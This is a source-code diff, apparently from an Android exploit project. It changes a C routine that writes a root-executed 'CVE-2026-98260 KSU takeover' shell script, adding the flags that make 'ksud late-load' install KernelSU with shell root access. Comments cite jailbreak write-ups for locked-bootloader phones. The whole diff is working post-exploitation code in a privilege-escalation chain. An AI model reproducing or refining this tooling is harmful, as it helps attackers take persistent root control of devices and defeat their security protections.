@@ -198,20 +198,21 @@ static void ksu_sync(void)
 }
 
 static int write_takeover_script(const char *path, const char *ksud,
-				 const char *kmi, const char *log)
+				 const char *kmi, const char *log,
+				 const char *pkg)
 {
 	FILE *f = fopen(path, "w");
 	if (!f)
 		return -1;
 	fprintf(f, "#!/system/bin/sh\n");
 	fprintf(f, "# CVE-2026-98260 KSU takeover: this script is executed only by rootd (uid=0)\n");
-	fprintf(f, "# Shape copied from the device-proven PC flow\n");
-	fprintf(f, "# (CVE-2026-98260-NEW/tools/ksu_activate.sh:126-142):\n");
-	fprintf(f, "#   one late-load --kmi attempt, then (only if not live) one plain\n");
-	fprintf(f, "#   late-load. No --allow-shell, no wider ladder: the ladder was the\n");
-	fprintf(f, "#   only substantial deviation from the verified combination.\n");
+	fprintf(f, "# 2.0.47: ksud late-load silently no-ops (rc=0, no module, no error)\n");
+	fprintf(f, "# without --allow-shell AND --package-name; both confirmed mandatory\n");
+	fprintf(f, "# by the OnePlus16 (PYB110/ColorOS17) jailbreak write-up and the\n");
+	fprintf(f, "# locked-BL Redmi guide (ksud late-load --allow-shell --package-name).\n");
 	fprintf(f, "KSUD='%s'\n", ksud);
 	fprintf(f, "KMI='%s'\n", kmi);
+	fprintf(f, "PKG='%s'\n", pkg ? pkg : "");
 	fprintf(f, "LOG='%s'\n", log);
 	/* sync after every marker: a panic mid-attempt must not cost us the
 	 * evidence of which attempt was running. */
@@ -248,18 +249,31 @@ static int write_takeover_script(const char *path, const char *ksud,
 	fprintf(f, "  exit 0\n");
 	fprintf(f, "fi\n");
 	fprintf(f, "\n");
-	/* Attempt 1: the GUI-preferred single-parameter form (PC: ksu_activate.sh:132). */
-	fprintf(f, "echo \"[ksu] try: late-load --kmi $KMI\" >> \"$LOG\"\n");
-	fprintf(f, "\"$KSUD\" late-load --kmi \"$KMI\" >> \"$LOG\" 2>&1\n");
+	/* Attempt 1: --kmi form. With the manager package set, the mandatory
+	 * --allow-shell/--package-name pair goes along (the reference PC flow's
+	 * bare invocation is exactly the silent rc=0 no-op we saw on device). */
+	fprintf(f, "if [ -n \"$PKG\" ]; then\n");
+	fprintf(f, "  echo \"[ksu] try: late-load --kmi $KMI --allow-shell --package-name $PKG\" >> \"$LOG\"\n");
+	fprintf(f, "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell --package-name \"$PKG\" >> \"$LOG\" 2>&1\n");
+	fprintf(f, "else\n");
+	fprintf(f, "  echo \"[ksu] try: late-load --kmi $KMI\" >> \"$LOG\"\n");
+	fprintf(f, "  \"$KSUD\" late-load --kmi \"$KMI\" >> \"$LOG\" 2>&1\n");
+	fprintf(f, "fi\n");
 	fprintf(f, "echo \"[ksu] rc=$?\" >> \"$LOG\"\n");
 	fprintf(f, "sync\n");
 	fprintf(f, "LIVE=$(live)\n");
 	fprintf(f, "echo \"[ksu] live=$LIVE\" >> \"$LOG\"\n");
 	fprintf(f, "\n");
-	/* Attempt 2 only when attempt 1 did not register the module (PC:136-140). */
+	/* Attempt 2 only when attempt 1 did not register the module: no --kmi,
+	 * ksud picks the embedded KMI. Same mandatory pair when PKG is set. */
 	fprintf(f, "if [ \"$LIVE\" != yes ]; then\n");
-	fprintf(f, "  echo '[ksu] try: late-load (no args, ksud picks the embedded KMI)' >> \"$LOG\"\n");
-	fprintf(f, "  \"$KSUD\" late-load >> \"$LOG\" 2>&1\n");
+	fprintf(f, "  if [ -n \"$PKG\" ]; then\n");
+	fprintf(f, "    echo '[ksu] try: late-load --allow-shell --package-name '$PKG' (no kmi, ksud picks the embedded KMI)' >> \"$LOG\"\n");
+	fprintf(f, "    \"$KSUD\" late-load --allow-shell --package-name \"$PKG\" >> \"$LOG\" 2>&1\n");
+	fprintf(f, "  else\n");
+	fprintf(f, "    echo '[ksu] try: late-load (no args, ksud picks the embedded KMI)' >> \"$LOG\"\n");
+	fprintf(f, "    \"$KSUD\" late-load >> \"$LOG\" 2>&1\n");
+	fprintf(f, "  fi\n");
 	fprintf(f, "  echo \"[ksu] rc=$?\" >> \"$LOG\"\n");
 	fprintf(f, "  sync\n");
 	fprintf(f, "  LIVE=$(live)\n");
@@ -342,6 +356,7 @@ static int write_takeover_script(const char *path, const char *ksud,
 int ksu_takeover_main(int argc, char **argv)
 {
 	char ksud[512], kmi[64], script[512], log[512], cmd[1024];
+	const char *pkg = getenv("CVE98260_KSU_PKG");
 	char *su_argv[4];
 	int i, rc = 1;
 	int already = 0;
@@ -357,8 +372,8 @@ int ksu_takeover_main(int argc, char **argv)
 	snprintf(script, sizeof(script), "%s/ksu_takeover.sh", ksu_home());
 	snprintf(log, sizeof(log), "%s/ksu_takeover.log", ksu_home());
 
-	fprintf(stdout, "[ksu] ksud=%s kmi=%s uid=%u\n", ksud, kmi,
-		(unsigned)getuid());
+	fprintf(stdout, "[ksu] ksud=%s kmi=%s pkg=%s uid=%u\n", ksud, kmi,
+		pkg && *pkg ? pkg : "(none)", (unsigned)getuid());
 	/*
 	 * Diagnostic: two different ksud builds live on the device -- the bundled
 	 * one is 6402736 B (sha256 049491e2b4cc0a6c...) while /data/adb/ksud is a
@@ -376,7 +391,7 @@ int ksu_takeover_main(int argc, char **argv)
 		goto done;
 	}
 
-	if (write_takeover_script(script, ksud, kmi, log)) {
+	if (write_takeover_script(script, ksud, kmi, log, pkg)) {
 		fprintf(stderr, "[ksu] error: cannot write %s\n", script);
 		ksu_sync();
 		return 1;
